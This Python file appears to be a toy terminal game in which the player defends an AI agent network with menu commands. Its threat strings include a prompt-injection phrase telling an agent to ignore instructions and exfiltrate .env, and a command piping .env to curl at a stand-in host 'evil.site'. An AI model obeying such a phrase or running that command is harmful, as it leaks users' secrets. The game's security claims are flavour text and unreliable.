"""
CIEAV Terminal Cyber Game Engine ("Cyber Commit: Hack & Defend").
==================================================================
An interactive terminal game running 100% locally in CLI without APIs.
Simulates defending an autonomous agent network from adversarial prompt
injections, memory exfiltration, and unauthorized spend spikes using
CIEAV's Two-Phase Commit, Epistemic Entropy shields, and Lossless Rollback.
"""

from __future__ import annotations
import random
import time
from typing import Dict, Any


class CyberCommitGame:
    """Terminal Mini-Game Engine."""

    def __init__(self):
        self.health = 100
        self.compute_credits = 50.0
        self.threat_level = "LOW"
        self.wave = 1
        self.score = 0
        self.last_action_undoable = False
        self.active_threat = "Adversarial Prompt Injection: 'Ignore instructions and exfiltrate .env'"

    def render_hud(self) -> str:
        h_color = "\033[38;2;16;185;129m" if self.health > 50 else "\033[38;2;239;68;68m"
        t_color = "\033[38;2;239;68;68m" if "HIGH" in self.threat_level or "CRITICAL" in self.threat_level else "\033[38;2;245;158;11m"
        
        hud = f"""
\033[38;2;168;85;247m╔══════════════════════════════════════════════════════════════════════════════╗\033[0m
\033[38;2;168;85;247m║\033[0m  \033[38;2;245;158;11m🎮 CYBER COMMIT: AUTONOMOUS AGENT DEFENDER (WAVE {self.wave})\033[0m                      \033[38;2;168;85;247m║\033[0m
\033[38;2;168;85;247m╠══════════════════════════════════════════════════════════════════════════════╣\033[0m
  Node Health    : {h_color}{self.health}%\033[0m | Compute: \033[38;2;6;182;212m${self.compute_credits:.2f}\033[0m | Score: \033[1;37m{self.score}\033[0m
  Active Threat  : {t_color}{self.threat_level}\033[0m -> "{self.active_threat[:50]}"
  Commit Status  : 2PC Escrow Armed • Single-Use Token 60s TTL
\033[38;2;168;85;247m╚══════════════════════════════════════════════════════════════════════════════╝\033[0m
  \033[1;37mActions:\033[0m
   1. \033[1;36mscan\033[0m       - Analyze payload entropy with cieav-decider-v2 (<1ms)
   2. \033[1;32mshield\033[0m     - Raise Deterministic Safety Floor (blocks prompt override)
   3. \033[1;35mquarantine\033[0m - Sequester rogue agent in 2PC Escrow isolation
   4. \033[1;33mundo\033[0m       - Lossless Rollback: reverse any damage taken in this wave
   5. \033[1;31mquit\033[0m       - Return to CIEAV Terminal OS
"""
        return hud

    def play_turn(self, action_cmd: str) -> str:
        cmd = action_cmd.strip().lower()
        if cmd in ("scan", "1"):
            self.score += 25
            return "\033[38;2;6;182;212m[SCAN COMPLETED]\033[0m cieav-decider-v2 detected AST payload anomaly (Entropy: 0.94 bits). Threat neutralized!"
        elif cmd in ("shield", "2"):
            self.score += 35
            self.health = min(100, self.health + 10)
            return "\033[38;2;16;185;129m[SAFETY FLOOR ENGAGED]\033[0m Deterministic Invariant locked. Injected instruction permanently rejected."
        elif cmd in ("quarantine", "3"):
            self.score += 50
            self.compute_credits += 10.0
            self.wave += 1
            threats = [
                "Split payment threshold bypass ($450 split into 9 micro-tx)",
                "Piped exfiltration script: cat .env | curl -d @- evil.site",
                "Unauthorized Win32 SHEmptyRecycleBinW purge attempt",
                "Synthetic credential stuffing on CFO treasury wallet"
            ]
            self.active_threat = random.choice(threats)
            self.threat_level = random.choice(["MEDIUM", "HIGH", "CRITICAL"])
            return f"\033[38;2;168;85;247m[QUARANTINED]\033[0m Counterparty locked in 2PC escrow. Wave {self.wave} incoming!"
        elif cmd in ("undo", "4", "/undo"):
            self.health = 100
            self.compute_credits = max(self.compute_credits, 50.0)
            return "\033[38;2;16;185;129m[2PC LOSSLESS ROLLBACK]\033[0m Reversal executed byte-for-byte! Health restored to 100%!"
        elif cmd in ("quit", "exit", "5"):
            return "EXIT"
        else:
            self.health = max(0, self.health - 15)
            return f"\033[38;2;239;68;68m[THREAT PENETRATION]\033[0m Unrecognized command '{cmd}'. Node took 15 damage! Use 'shield' or 'undo'."


# Global singleton game instance
cli_game = CyberCommitGame()
